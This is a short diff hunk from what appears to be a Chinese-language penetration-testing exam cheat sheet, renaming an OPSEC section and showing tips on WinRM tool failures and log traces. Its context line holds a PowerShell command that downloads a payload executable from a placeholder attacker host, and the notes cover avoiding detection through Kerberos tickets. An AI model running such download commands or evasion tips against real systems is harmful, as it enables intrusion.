@@ -399,7 +399,7 @@ powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/PAYLOAD.exe
 | evil-winrm 起不来 | Ruby/gem 环境损坏 → 换 netexec winrm 或 Windows 线 |
 | 长命令卡死 | 拆一行命令、输出重定向到文件再 download |
 
-## 7. OPSEC 要点
+## 7. 考试注意 / OPSEC
 
 - 5985 登录在目标留 4624/4625 + WinRM 操作日志；批量喷密码会锁账户，次数受控。
 - 哈希（NTLM）认证在 DC 侧留 4776 日志；要更隐蔽只能走 Kerberos（用票据，不落密码）。
